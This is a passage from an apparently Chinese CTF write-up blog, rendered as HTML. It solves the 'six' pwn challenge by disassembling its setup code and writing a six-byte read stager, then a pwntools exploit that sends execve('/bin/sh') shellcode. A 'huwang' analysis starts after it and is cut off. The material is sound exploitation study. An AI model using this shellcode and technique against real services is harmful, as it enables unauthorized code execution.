4Dh ; M</span><br><span class="line">.data:0000000000202042                 db  31h ; 1</span><br><span class="line">.data:0000000000202043                 db 0DBh</span><br><span class="line">.data:0000000000202044                 db  4Dh ; M</span><br><span class="line">.data:0000000000202045                 db  31h ; 1</span><br><span class="line">.data:0000000000202046                 db 0E4h</span><br><span class="line">.data:0000000000202047                 db  4Dh ; M</span><br><span class="line">.data:0000000000202048                 db  31h ; 1</span><br><span class="line">.data:0000000000202049                 db 0EDh</span><br><span class="line">.data:000000000020204A                 db  4Dh ; M</span><br><span class="line">.data:000000000020204B                 db  31h ; 1</span><br><span class="line">.data:000000000020204C                 db 0F6h</span><br><span class="line">.data:000000000020204D                 db  4Dh ; M</span><br><span class="line">.data:000000000020204E                 db  31h ; 1</span><br><span class="line">.data:000000000020204F                 db 0FFh</span><br><span class="line">.data:0000000000202050                 db    0</span><br><span class="line">.data:0000000000202051                 db    0</span><br></pre></td></tr></table></figure><p>这里四种方法(我知道的)可以将一串16进制机器码转换为汇编代码：</p><blockquote><p>1、直接使用IDA进行转换，工具条或者快捷键<br>2、使用nasm的ndisasm进行反汇编，ndisasm.exe -b 64 文件名，文件为包含机器码的bin文件<br>3、使用Pwndbg的disasm命令，disasm -c amd64 ‘str’,str为机器码16进制字符串<br>4、使用pwntools的disasm()，print disasm(‘str’.decode(‘hex’),arch = ‘amd64’),str同样为机器码16进制字符串</p></blockquote><p>既然src的数据可以执行，我们将这串机器码反汇编，然后得到如下代码：</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>、IDA转换</span><br><span class="line"><span class="symbol">.data:</span><span class="number">0000000000202021</span> <span class="number">48</span> <span class="number">89</span> FC      <span class="keyword">mov</span>     <span class="built_in">rsp</span>, <span class="built_in">rdi</span></span><br><span class="line"><span class="symbol">.data:</span><span class="number">0000000000202023</span> <span class="number">48</span> <span class="number">31</span> ED      <span class="keyword">xor</span>     <span class="built_in">rbp</span>, <span class="built_in">rbp</span></span><br><span class="line"><span class="symbol">.data:</span><span class="number">0000000000202026</span> <span class="number">48</span> <span class="number">31</span> C0      <span class="keyword">xor</span>     <span class="built_in">rax</span>, <span class="built_in">rax</span></span><br><span class="line"><span class="symbol">.data:</span><span class="number">0000000000202029</span> <span class="number">48</span> <span class="number">31</span> <span class="built_in">DB</span>      <span class="keyword">xor</span>     <span class="built_in">rbx</span>, <span class="built_in">rbx</span></span><br><span class="line"><span class="symbol">.data:</span>000000000020202C <span class="number">48</span> <span class="number">31</span> C9      <span class="keyword">xor</span>     <span class="built_in">rcx</span>, <span class="built_in">rcx</span></span><br><span class="line"><span class="symbol">.data:</span>000000000020202F <span class="number">48</span> <span class="number">31</span> D2      <span class="keyword">xor</span>     <span class="built_in">rdx</span>, <span class="built_in">rdx</span></span><br><span class="line"><span class="symbol">.data:</span><span class="number">0000000000202032</span> <span class="number">48</span> <span class="number">31</span> FF      <span class="keyword">xor</span>     <span class="built_in">rdi</span>, <span class="built_in">rdi</span></span><br><span class="line"><span class="symbol">.data:</span><span class="number">0000000000202035</span> <span class="number">48</span> <span class="number">31</span> F6      <span class="keyword">xor</span>     <span class="built_in">rsi</span>, <span class="built_in">rsi</span></span><br><span class="line"><span class="symbol">.data:</span><span class="number">0000000000202038</span> <span class="number">4D</span> <span class="number">31</span> C0      <span class="keyword">xor</span>     <span class="built_in">r8</span>, <span class="built_in">r8</span></span><br><span class="line"><span class="symbol">.data:</span>000000000020203B <span class="number">4D</span> <span class="number">31</span> C9      <span class="keyword">xor</span>     <span class="built_in">r9</span>, <span class="built_in">r9</span></span><br><span class="line"><span class="symbol">.data:</span>000000000020203E <span class="number">4D</span> <span class="number">31</span> D2      <span class="keyword">xor</span>     <span class="built_in">r10</span>, <span class="built_in">r10</span></span><br><span class="line"><span class="symbol">.data:</span><span class="number">0000000000202041</span> <span class="number">4D</span> <span class="number">31</span> <span class="built_in">DB</span>      <span class="keyword">xor</span>     <span class="built_in">r11</span>, <span class="built_in">r11</span></span><br><span class="line"><span class="symbol">.data:</span><span class="number">0000000000202044</span> <span class="number">4D</span> <span class="number">31</span> E4      <span class="keyword">xor</span>     <span class="built_in">r12</span>, <span class="built_in">r12</span></span><br><span class="line"><span class="symbol">.data:</span><span class="number">0000000000202047</span> <span class="number">4D</span> <span class="number">31</span> ED      <span class="keyword">xor</span>     <span class="built_in">r13</span>, <span class="built_in">r13</span></span><br><span class="line"><span class="symbol">.data:</span>000000000020204A <span class="number">4D</span> <span class="number">31</span> F6      <span class="keyword">xor</span>     <span class="built_in">r14</span>, <span class="built_in">r14</span></span><br><span class="line"><span class="symbol">.data:</span><span class="number">000000000020204D</span> <span class="number">4D</span> <span class="number">31</span> FF      <span class="keyword">xor</span>     <span class="built_in">r15</span>, <span class="built_in">r15</span></span><br><span class="line"></span><br><span class="line"><span class="number">2</span>、ndisasm转换</span><br><span class="line">λ ndisasm.exe -b <span class="number">64</span> lblb.bin</span><br><span class="line"><span class="number">00000000</span>  4889FC            <span class="keyword">mov</span> <span class="built_in">rsp</span>,<span class="built_in">rdi</span></span><br><span class="line"><span class="number">00000003</span>  4831ED            <span class="keyword">xor</span> <span class="built_in">rbp</span>,<span class="built_in">rbp</span></span><br><span class="line"><span class="number">00000006</span>  4831C0            <span class="keyword">xor</span> <span class="built_in">rax</span>,<span class="built_in">rax</span></span><br><span class="line"><span class="number">00000009</span>  4831<span class="built_in">DB</span>            <span class="keyword">xor</span> <span class="built_in">rbx</span>,<span class="built_in">rbx</span></span><br><span class="line">0000000C  4831C9            <span class="keyword">xor</span> <span class="built_in">rcx</span>,<span class="built_in">rcx</span></span><br><span class="line">0000000F  4831D2            <span class="keyword">xor</span> <span class="built_in">rdx</span>,<span class="built_in">rdx</span></span><br><span class="line"><span class="number">00000012</span>  4831FF            <span class="keyword">xor</span> <span class="built_in">rdi</span>,<span class="built_in">rdi</span></span><br><span class="line"><span class="number">00000015</span>  4831F6            <span class="keyword">xor</span> <span class="built_in">rsi</span>,<span class="built_in">rsi</span></span><br><span class="line"><span class="number">00000018</span>  4D31C0            <span class="keyword">xor</span> <span class="built_in">r8</span>,<span class="built_in">r8</span></span><br><span class="line"><span class="number">0000001B</span>  4D31C9            <span class="keyword">xor</span> <span class="built_in">r9</span>,<span class="built_in">r9</span></span><br><span class="line">0000001E  4D31D2            <span class="keyword">xor</span> <span class="built_in">r10</span>,<span class="built_in">r10</span></span><br><span class="line"><span class="number">00000021</span>  4D31DB            <span class="keyword">xor</span> <span class="built_in">r11</span>,<span class="built_in">r11</span></span><br><span class="line"><span class="number">00000024</span>  4D31E4            <span class="keyword">xor</span> <span class="built_in">r12</span>,<span class="built_in">r12</span></span><br><span class="line"><span class="number">00000027</span>  4D31ED            <span class="keyword">xor</span> <span class="built_in">r13</span>,<span class="built_in">r13</span></span><br><span class="line">0000002A  4D31F6            <span class="keyword">xor</span> <span class="built_in">r14</span>,<span class="built_in">r14</span></span><br><span class="line"><span class="number">0000002D</span>  4D31FF            <span class="keyword">xor</span> <span class="built_in">r15</span>,<span class="built_in">r15</span></span><br><span class="line"></span><br><span class="line"><span class="number">3</span>、pwndbg的disasm转换</span><br><span class="line">pwndbg&gt; disasm -c amd64 <span class="string">'4889FC4831ED4831C04831DB4831C94831D24831FF4831F64D31C04D31C94D31D24D31DB4D31E44D31ED4D31F64D31FF'</span>   </span><br><span class="line">   <span class="number">0</span>:    <span class="number">48</span> <span class="number">89</span> fc                 <span class="keyword">mov</span>    <span class="built_in">rsp</span>, <span class="built_in">rdi</span></span><br><span class="line">   <span class="number">3</span>:    <span class="number">48</span> <span class="number">31</span> ed                 <span class="keyword">xor</span>    <span class="built_in">rbp</span>, <span class="built_in">rbp</span></span><br><span class="line">   <span class="number">6</span>:    <span class="number">48</span> <span class="number">31</span> c0                 <span class="keyword">xor</span>    <span class="built_in">rax</span>, <span class="built_in">rax</span></span><br><span class="line">   <span class="number">9</span>:    <span class="number">48</span> <span class="number">31</span> <span class="built_in">db</span>                 <span class="keyword">xor</span>    <span class="built_in">rbx</span>, <span class="built_in">rbx</span></span><br><span class="line"><span class="symbol">   c:</span>    <span class="number">48</span> <span class="number">31</span> c9                 <span class="keyword">xor</span>    <span class="built_in">rcx</span>, <span class="built_in">rcx</span></span><br><span class="line"><span class="symbol">   f:</span>    <span class="number">48</span> <span class="number">31</span> d2                 <span class="keyword">xor</span>    <span class="built_in">rdx</span>, <span class="built_in">rdx</span></span><br><span class="line">  <span class="number">12</span>:    <span class="number">48</span> <span class="number">31</span> ff                 <span class="keyword">xor</span>    <span class="built_in">rdi</span>, <span class="built_in">rdi</span></span><br><span class="line">  <span class="number">15</span>:    <span class="number">48</span> <span class="number">31</span> f6                 <span class="keyword">xor</span>    <span class="built_in">rsi</span>, <span class="built_in">rsi</span></span><br><span class="line">  <span class="number">18</span>:    <span class="number">4d</span> <span class="number">31</span> c0                 <span class="keyword">xor</span>    <span class="built_in">r8</span>, <span class="built_in">r8</span></span><br><span class="line">  <span class="number">1b</span>:    <span class="number">4d</span> <span class="number">31</span> c9                 <span class="keyword">xor</span>    <span class="built_in">r9</span>, <span class="built_in">r9</span></span><br><span class="line">  1e:    <span class="number">4d</span> <span class="number">31</span> d2                 <span class="keyword">xor</span>    <span class="built_in">r10</span>, <span class="built_in">r10</span></span><br><span class="line">  <span class="number">21</span>:    <span class="number">4d</span> <span class="number">31</span> <span class="built_in">db</span>                 <span class="keyword">xor</span>    <span class="built_in">r11</span>, <span class="built_in">r11</span></span><br><span class="line">  <span class="number">24</span>:    <span class="number">4d</span> <span class="number">31</span> e4                 <span class="keyword">xor</span>    <span class="built_in">r12</span>, <span class="built_in">r12</span></span><br><span class="line">  <span class="number">27</span>:    <span class="number">4d</span> <span class="number">31</span> ed                 <span class="keyword">xor</span>    <span class="built_in">r13</span>, <span class="built_in">r13</span></span><br><span class="line">  2a:    <span class="number">4d</span> <span class="number">31</span> f6                 <span class="keyword">xor</span>    <span class="built_in">r14</span>, <span class="built_in">r14</span></span><br><span class="line">  <span class="number">2d</span>:    <span class="number">4d</span> <span class="number">31</span> ff                 <span class="keyword">xor</span>    <span class="built_in">r15</span>, <span class="built_in">r15</span></span><br><span class="line"></span><br><span class="line"><span class="number">4</span>、pwntools的disasm()转换</span><br><span class="line">&gt;&gt;&gt; print disasm(<span class="string">'4889FC4831ED4831C04831DB4831C94831D24831FF4831F64D31C04D31C94D31D24D31DB4D31E44D31ED4D31F64D31FF'</span>.decode(<span class="string">'hex'</span>),arch = <span class="string">'amd64'</span>)</span><br><span class="line">   <span class="number">0</span>:   <span class="number">48</span> <span class="number">89</span> fc                <span class="keyword">mov</span>    <span class="built_in">rsp</span>,<span class="built_in">rdi</span></span><br><span class="line">   <span class="number">3</span>:   <span class="number">48</span> <span class="number">31</span> ed                <span class="keyword">xor</span>    <span class="built_in">rbp</span>,<span class="built_in">rbp</span></span><br><span class="line">   <span class="number">6</span>:   <span class="number">48</span> <span class="number">31</span> c0                <span class="keyword">xor</span>    <span class="built_in">rax</span>,<span class="built_in">rax</span></span><br><span class="line">   <span class="number">9</span>:   <span class="number">48</span> <span class="number">31</span> <span class="built_in">db</span>                <span class="keyword">xor</span>    <span class="built_in">rbx</span>,<span class="built_in">rbx</span></span><br><span class="line"><span class="symbol">   c:</span>   <span class="number">48</span> <span class="number">31</span> c9                <span class="keyword">xor</span>    <span class="built_in">rcx</span>,<span class="built_in">rcx</span></span><br><span class="line"><span class="symbol">   f:</span>   <span class="number">48</span> <span class="number">31</span> d2                <span class="keyword">xor</span>    <span class="built_in">rdx</span>,<span class="built_in">rdx</span></span><br><span class="line">  <span class="number">12</span>:   <span class="number">48</span> <span class="number">31</span> ff                <span class="keyword">xor</span>    <span class="built_in">rdi</span>,<span class="built_in">rdi</span></span><br><span class="line">  <span class="number">15</span>:   <span class="number">48</span> <span class="number">31</span> f6                <span class="keyword">xor</span>    <span class="built_in">rsi</span>,<span class="built_in">rsi</span></span><br><span class="line">  <span class="number">18</span>:   <span class="number">4d</span> <span class="number">31</span> c0                <span class="keyword">xor</span>    <span class="built_in">r8</span>,<span class="built_in">r8</span></span><br><span class="line">  <span class="number">1b</span>:   <span class="number">4d</span> <span class="number">31</span> c9                <span class="keyword">xor</span>    <span class="built_in">r9</span>,<span class="built_in">r9</span></span><br><span class="line">  1e:   <span class="number">4d</span> <span class="number">31</span> d2                <span class="keyword">xor</span>    <span class="built_in">r10</span>,<span class="built_in">r10</span></span><br><span class="line">  <span class="number">21</span>:   <span class="number">4d</span> <span class="number">31</span> <span class="built_in">db</span>                <span class="keyword">xor</span>    <span class="built_in">r11</span>,<span class="built_in">r11</span></span><br><span class="line">  <span class="number">24</span>:   <span class="number">4d</span> <span class="number">31</span> e4                <span class="keyword">xor</span>    <span class="built_in">r12</span>,<span class="built_in">r12</span></span><br><span class="line">  <span class="number">27</span>:   <span class="number">4d</span> <span class="number">31</span> ed                <span class="keyword">xor</span>    <span class="built_in">r13</span>,<span class="built_in">r13</span></span><br><span class="line">  2a:   <span class="number">4d</span> <span class="number">31</span> f6                <span class="keyword">xor</span>    <span class="built_in">r14</span>,<span class="built_in">r14</span></span><br><span class="line">  <span class="number">2d</span>:   <span class="number">4d</span> <span class="number">31</span> ff                <span class="keyword">xor</span>    <span class="built_in">r15</span>,<span class="built_in">r15</span></span><br></pre></td></tr></table></figure><p>我们可以看到，src处的代码功能为，将esp指向分配的具有可执行权限的内存块，并且将其他寄存器清0。执行完上述代码，就开始执行我们输入的6字节shellcode，6个字节直接获取shell是不可能的了，所以我们换种思路。通过调用0号系统调用read，将用于获取shell交互的shellcode读入一块可执行内存中，并且调用。我们从rsp开始写入数据，一直写到rip所指向的位置，就可以执行获取shell的shellcode了。</p><p>调用read的代码如下，也就是那六个字节的shellcode。</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span>:    <span class="number">54</span>           <span class="keyword">push</span>   <span class="built_in">rsp</span></span><br><span class="line"><span class="number">1</span>:    5e           <span class="keyword">pop</span>    <span class="built_in">rsi</span></span><br><span class="line"><span class="number">2</span>:    <span class="number">89</span> f2        <span class="keyword">mov</span>    <span class="built_in">edx</span>, <span class="built_in">esi</span></span><br><span class="line"><span class="number">4</span>:    0f <span class="number">05</span>        <span class="keyword">syscall</span></span><br><span class="line"><span class="comment">;54 5e 89 f2 0f 05</span></span><br></pre></td></tr></table></figure><p>接下来获取shell的shellcode，有两种方式，一种是直接使用pwntools生成的shellcode，另一种则是调用系统调用execve(/bin/sh).由于此利用方法的局限性，并不能每次都执行成功，只有当从/dev/urandom读出的两个地址都超出0x00007FFFFFFFFFFF时，mmap才会随机分配两块内存，才能满足利用的条件。</p><h4 id="0x03-exp-1"><a href="#0x03-exp-1" class="headerlink" title="0x03 exp"></a>0x03 exp</h4><p>下面是exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.clear()</span><br><span class="line"><span class="comment"># context.log_level = 'debug'</span></span><br><span class="line">context.binary =<span class="string">'./six'</span></span><br><span class="line">context = &#123;<span class="string">'arch'</span>:<span class="string">'amd64'</span>,<span class="string">'bits'</span>:<span class="string">'64'</span>,<span class="string">'endian'</span>:<span class="string">'little'</span>,<span class="string">'os'</span>:<span class="string">'linux'</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> args[<span class="string">'REMOTE'</span>]:</span><br><span class="line">    Io = remote(<span class="string">'127.0.0.1'</span>,<span class="number">10000</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    Io = process(<span class="string">'./six'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(Io)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># send payload1</span></span><br><span class="line">payload1 = asm(<span class="string">'''</span></span><br><span class="line"><span class="string">                push rsp</span></span><br><span class="line"><span class="string">                pop  rsi</span></span><br><span class="line"><span class="string">                mov  edx,esi</span></span><br><span class="line"><span class="string">                syscall</span></span><br><span class="line"><span class="string">                '''</span>) <span class="comment"># 545e89f20f05</span></span><br><span class="line"><span class="comment"># payload1 = chr(0x54) + chr(0x5e) + chr(0x89) + chr(0xf2) + chr(0x0F) + chr(0x05)</span></span><br><span class="line">Io.recvuntil(<span class="string">'Show Ne0 your shellcode:'</span>)</span><br><span class="line">Io.send(payload1)</span><br><span class="line"></span><br><span class="line"><span class="comment"># send payload2</span></span><br><span class="line"><span class="comment"># one method of shell </span></span><br><span class="line">shell = asm(<span class="string">'''</span></span><br><span class="line"><span class="string">            mov eax,0x3b</span></span><br><span class="line"><span class="string">            mov rdi,rsi</span></span><br><span class="line"><span class="string">            add rdi,0xb4d</span></span><br><span class="line"><span class="string">            xor rdx,rdx</span></span><br><span class="line"><span class="string">            xor rsi,rsi</span></span><br><span class="line"><span class="string">            syscall</span></span><br><span class="line"><span class="string">            '''</span>) <span class="comment"># b83b0000004889f74881c74d0b00004831d24831f60f05</span></span><br><span class="line">shell += <span class="string">"/bin/sh\0"</span> <span class="comment"># 2f62696e2f736800</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># the other method of shell</span></span><br><span class="line"><span class="comment"># shell = asm(shellcraft.sh())</span></span><br><span class="line">payload2 = <span class="string">'\x90'</span>*(<span class="number">0x1000</span><span class="number">-0x500</span>+<span class="number">0x30</span>+<span class="number">0x06</span>) + shell</span><br><span class="line"></span><br><span class="line">Io.sendline(payload2)</span><br><span class="line">Io.interactive()</span><br></pre></td></tr></table></figure><h4 id="0x04-总结-1"><a href="#0x04-总结-1" class="headerlink" title="0x04 总结"></a>0x04 总结</h4><p>这道题主要考的是Linux系统下，怎么利用汇编来进行系统调用。以及使用mmap()函数，分配内存块时的策略。</p><h3 id="huwang"><a href="#huwang" class="headerlink" title="huwang"></a>huwang</h3><h4 id="0x00-file-amp-amp-checksec-2"><a href="#0x00-file-amp-amp-checksec-2" class="headerlink" title="0x00 file &amp;&amp; checksec"></a>0x00 file &amp;&amp; checksec</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$ file huwang </span><br><span class="line">huwang: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, <span class="keyword">for</span> GNU/Linux 2.6.32, BuildID[sha1]=f74d9c8c7f896833ec74d4a898784772c139878a, stripped</span><br><span class="line">$ checksec huwang</span><br><span class="line">[*] <span class="string">'/home/.../Desktop/huwang/huwang'</span></span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure><p>可以看到这是一个64bit的ELF程序，并且stripped掉了符号表。保护措施，除了PIE没有开启，也就是地址不会随机化，其他都开启了。</p><h4 id="0x01-观察程序行为-1"><a href="#0x01-观察程序行为-1" class="headerlink" title="0x01 观察程序行为"></a>0x01 观察程序行为</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line">$ ./huwang </span><br><span class="line"> _   _     __        __                ____       _ </span><br><span class="line">| | | |_   \ \      / /_ _ _ __   __ _| __ )  ___(_)</span><br><span class="line">| |_| | | | \ \ /\ / / _` | <span class="string">'_ \ / _` |  _ \ / _ \ |</span></span><br><span class="line"><span class="string">|  _  | |_| |\ V  V / (_| | | | | (_| | |_) |  __/ |</span></span><br><span class="line"><span class="string">|_| |_|\__,_| \_/\_/ \__,_|_| |_|\__, |____/ \___|_|</span></span><br><span class="line"><span class="string">                                 |___/              </span></span><br><span class="line"><span class="string">---------menu---------</span></span><br><span class="line"><span class="string">1. Add Note</span></span><br><span class="line"><span class="string">2. Delete Note</span></span><br><span class="line"><span class="string">3. Show Note</span></span><br><span class="line"><span class="string">4. Exit</span></span><br><span class="line"><span class="string">command&gt;&gt; </span></span><br><span class="line"><span class="string">3</span></span><br><span class="line"><span class="string">Sorry, an unknown error has occurred!</span></span><br><span class="line"><span class="string">---------menu---------</span></span><br><span class="line"><span class="string">1. Add Note</span></span><br><span class="line"><span class="string">2. Delete Note</span></span><br><span class="line"><span class="string">3. Show Note</span></span><br><span class="line"><span class="string">4. Exit</span></span><br><span class="line"><span class="string">command&gt;&gt; </span></span><br><span class="line"><span class="string">1</span></span><br><span class="line"><span class="string">size:5</span></span><br><span class="line"><span class="string">content:12345</span></span><br><span class="line"><span class="string">Success~</span></span><br><span class="line"><span class="string">---------menu---------</span></span><br><span class="line"><span class="string">1. Add Note</span></span><br><span class="line"><span class="string">2. Delete Note</span></span><br><span class="line"><span class="string">3. Show Note</span></span><br><span class="line"><span class="string">4. Exit</span></span><br><span class="line"><span class="string">command&gt;&gt; </span></span><br><span class="line"><span class="string">invalid choice</span></span><br><span class="line"><span class="string">---------menu---------</span></span><br><span class="line"><span class="string">1. Add Note</span></span><br><span class="line"><span class="string">2. Delete Note</span></span><br><span class="line"><span class="string">3. Show Note</span></span><br><span class="line"><span class="string">4. Exit</span></span><br><span class="line"><span class="string">command&gt;&gt; </span></span><br><span class="line"><span class="string">3</span></span><br><span class="line"><span class="string">Sorry, an unknown error has occurred!</span></span><br><span class="line"><span class="string">---------menu---------</span></span><br><span class="line"><span class="string">1. Add Note</span></span><br><span class="line"><span class="string">2. Delete Note</span></span><br><span class="line"><span class="string">3. Show Note</span></span><br><span class="line"><span class="string">4. Exit</span></span><br><span class="line"><span class="string">command&gt;&gt; </span></span><br><span class="line"><span class="string">2</span></span><br><span class="line"><span class="string">index:1</span></span><br><span class="line"><span class="string">---------menu---------</span></span><br><span class="line"><span class="string">1. Add Note</span></span><br><span class="line"><span class="string">2. Delete Note</span></span><br><span class="line"><span class="string">3. Show Note</span></span><br><span class="line"><span class="string">4. Exit</span></span><br><span class="line"><span class="string">command&gt;&gt; </span></span><br><span class="line"><span class="string">4</span></span><br></pre></td></tr></table></figure><p>可以看到，不管有没有Note,选Show Note，都显示Sorry, an unknown error has occurred!其它没什么特别的。下面我们用IDA打开来看看。</p><h4 id="0x02-IDA分析-2"><a href="#0x02-IDA分析-2" class="headerlink" title="0x02 IDA分析"></a>0x02 IDA分析</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> __fastcall __<span class="function">noreturn <span class="title">main</span><span class="params">(__int64 a1, <span class="keyword">char</span> **a2, <span class="keyword">char</span> **a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v3; <span class="comment">// eax</span></span><br><span class="line"></span><br><span class="line">  set_timer();</span><br><span class="line">  banner();</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      menu();</span><br><span class="line">      v3 = get_option_num();                    <span class="comment">// 获取选项</span></span><br><span class="line">      <span class="keyword">if</span> ( v3 != <span class="number">3</span> )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      show_note();                              <span class="comment">// 3.显示Note</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( v3 &gt; <span class="number">3</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( v3 == <span class="number">4</span> )                            <span class="comment">// 4.退出</span></span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">      <span class="keyword">if</span> ( v3 == <span class="number">666</span> )</span><br><span class="line">        option_666();                           <span class="comment">// 选项666</span></span><br><span class="line">LABEL_15:</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">"invalid choice"</span>);                   <span class="comment">// 无效的选择</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> ( v3 == <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      add_note();                               <span class="comment">// 1.添加Note</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( v3 != <span class="number">2</span> )</span><br><span class="line">        <span class="keyword">goto</span> LABEL_15;</span><br><span class="line">      delete_note();                            <span class="comment">// 2.删除Note</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span 